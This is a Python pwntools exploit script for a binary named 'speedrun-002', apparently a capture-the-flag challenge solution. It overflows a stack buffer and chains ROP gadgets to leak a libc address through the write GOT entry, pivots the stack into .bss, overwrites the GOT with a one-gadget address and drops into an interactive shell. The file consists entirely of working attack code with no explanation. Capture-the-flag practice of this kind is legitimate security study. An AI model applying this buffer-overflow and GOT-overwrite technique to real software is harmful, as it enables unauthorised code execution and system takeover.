from pwn import *


binpath = './speedrun-002'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
libc = elf.libc

gdbscript = '''
pwn
# b *0x400797

# read
# b *0x40072e

# ret
b *0x4007ba
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)


payload = 'Everything intelligent is so boring.'
payload = payload.ljust(0x12c, '\x00')
io.recvuntil('What say you now?')
io.send(payload)
io.recvuntil('Tell me more.\n')


addr_bss = 0x601000 + 0x100 + 8
addr_pop_rdi = 0x00000000004008a3
addr_pop_rsi_r15 = 0x00000000004008a1
addr_pop_rdx = 0x00000000004006ec
addr_pop_rbp = 0x0000000000400668
addr_leave_ret = 0x000000000040074a


rop = ''
# write(1, elf.got["write"], 8)
rop += p64(addr_pop_rdi)
rop += p64(1)
rop += p64(addr_pop_rsi_r15)
rop += p64(elf.got["write"])
rop += p64(0xdeadbeaf)
rop += p64(addr_pop_rdx)
rop += p64(8)
rop += p64(elf.plt["write"])

# read(0, addr_bss, 0x300)
rop += p64(addr_pop_rdi)
rop += p64(0)
rop += p64(addr_pop_rsi_r15)
rop += p64(addr_bss)
rop += p64(0xdeadbeaf)
rop += p64(addr_pop_rdx)
rop += p64(0x300)
rop += p64(elf.plt["read"])

# stack pivot
rop += p64(addr_pop_rbp)
rop += p64(addr_bss - 8)
rop += p64(addr_leave_ret)

payload = 'A' * 0x408 + rop
payload = payload.ljust(0x7da, '\x00')

io.send(payload)
io.recvuntil('Fascinating.\n')

data = io.recv(0x3f)
while data.startswith('Warning'):
    data = io.recv(0x3f)
print hexdump(data)
addr_libc = u64(data) - libc.symbols['write']
print hex(addr_libc)

rop = ''
# read(0, elf.got['write'], 0x8)
rop += p64(addr_pop_rdi)
rop += p64(0)
rop += p64(addr_pop_rsi_r15)
rop += p64(elf.got['write'])
rop += p64(0xdeadbeaf)
rop += p64(addr_pop_rdx)
rop += p64(0x8)
rop += p64(elf.plt["read"])

# write("/bin/sh") -> system("/bin/sh")
rop += p64(addr_pop_rdi)
rop += p64(addr_libc + next(libc.search('/bin/sh')))
rop += p64(elf.plt["write"])

payload = rop.ljust(0x300, '\x00')

# send new rop chain on stack pivot
io.send(payload)

# overwrite got
io.send(p64(addr_libc + 0x4f322))
# io.send(p64(addr_libc + libc.symbols['system']))

io.interactive()
